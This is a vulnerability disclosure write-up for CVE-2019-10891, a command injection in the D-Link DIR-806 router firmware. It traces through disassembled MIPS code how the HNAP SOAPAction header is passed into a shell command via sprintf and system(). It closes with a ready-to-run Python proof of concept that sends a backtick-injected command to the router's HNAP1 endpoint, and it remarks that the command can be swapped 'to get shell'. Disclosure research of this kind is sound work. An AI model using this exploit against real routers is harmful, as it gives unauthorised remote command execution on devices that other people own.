# DIR-806_Code_Injection
## CVE-2019-10891

The fireware is the lasted version of DIR-806 in D-LINK website：
```
http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-806 
```
## Vulnerability Analyze
When the router get the request of HNAP, it will call the hnap_main() function in /htdocs/cgibin,then it get SOAPAction by getenv :
```
.text:00411FAC                 la      $a0, aHttp_authoriza  # "HTTP_AUTHORIZATION"
.text:00411FB0                 lui     $a0, 0x42  # 'B'
.text:00411FB4                 lw      $gp, 0x248+var_230($sp)
.text:00411FB8                 la      $a0, aHttp_soapactio  # "HTTP_SOAPACTION"
.text:00411FBC                 la      $t9, getenv
.text:00411FC0                 jalr    $t9 ; getenv
.text:00411FC4                 move    $s2, $v0
.text:00411FC8                 lui     $a0, 0x42  # 'B'
.text:00411FCC                 lw      $gp, 0x248+var_230($sp)
.text:00411FD0                 la      $a0, aRequest_method  # "REQUEST_METHOD"
.text:00411FD4                 la      $t9, getenv
```
then it will check the SOAPAction start with `http://purenetworks.com/HNAP1/GetDeviceSettings`:
```
.text:00411FF0                 la      $t9, strstr
.text:00411FF4                 la      $a1, aHttpPurenetwor  # "http://purenetworks.com/HNAP1/GetDevice"...
.text:00411FF8                 jalr    $t9 ; strstr
.text:00411FFC                 move    $a0, $s0         # haystack
.text:00412000                 lw      $gp, 0x248+var_230($sp)
.text:00412004                 bnez    $v0, loc_412044
```
then the function will get the string in SOAPAction that after the right "/" by strrchr:
```
.text:00412044                 la      $t9, strrchr
.text:00412048                 move    $a0, $s0         # s
.text:0041204C                 jalr    $t9 ; strrchr
.text:00412050                 li      $a1, 0x2F  # '/'  # c
.text:00412054                 lw      $gp, 0x248+var_230($sp)
.text:00412058                 bnez    $v0, loc_412080
```
finally it will call sprintf to make a shell and call system to run it：
```
.text:00412420                 move    $a0, $s4
.text:00412424                 la      $a2, aVarRun_0   # "/var/run/"
.text:00412428                 b       loc_412440
.text:0041242C                 la      $a1, aShSS_shDevCons  # "sh %s%s.sh > /dev/console"
.text:00412430  # ---------------------------------------------------------------------------
.text:00412430
.text:00412430 loc_412430:                              # CODE XREF: hnap_main+4C4↑j
.text:00412430                 lui     $a1, 0x42  # 'B'
.text:00412434                 move    $a0, $s4         # s
.text:00412438                 addiu   $a2, (aVarRun_0 - 0x420000)  # "/var/run/"
.text:0041243C                 la      $a1, aShSS_shDevCo_0  # "sh %s%s.sh > /dev/console &"
.text:00412440
.text:00412440 loc_412440:                              # CODE XREF: hnap_main+4D8↑j
.text:00412440                 jalr    $t9 ; sprintf
.text:00412444                 move    $a3, $s0
.text:00412448                 lw      $gp, 0x248+var_230($sp)
.text:0041244C                 la      $t9, system
.text:00412450                 jalr    $t9 ; system
```
so when we make a fake SOAPAction start with `http://purenetworks.com/HNAP1/GetDeviceSettings` and end with `/our cmd`,it will finally execv our cmd in system function
## POC
```
from pwn import *
import requests
import sys

data="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\
  <soap:Body>\
    <GetWanSettings xmlns=\"http://purenetworks.com/HNAP1/\">\
    </GetWanSettings>\
  </soap:Body>\
</soap:Envelope>"

if __name__=="__main__":
    cmd="reboot" #the shell you want execv,it can't include "/"
    fake_cmd="http://purenetworks.com/HNAP1/GetDeviceSettings/`%s`"  %cmd
    print fake_cmd
    header = {
        'SOAPAction' : fake_cmd,
        'Cookie'        : "uid=LS32Srlx8N",
        'Content-Type'  : 'text/xml',
        'Content-Length': str(len(data))
        }
    url="http://192.168.0.1/HNAP1/"
    r=requests.post(url=url,headers=header,data=data)
    print r.content
    log.info("Kirin-say PWN")
```
when you run this poc,it will reboot the router(DIR-806),and you can also edit the cmd you want to run to get shell or something else.
For example(I run the fireware in firm dyne and run its web server,when I run the POC,the router reboot successfully)
![Success](https://upload-images.jianshu.io/upload_images/7434375-62cf44267ffd84b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
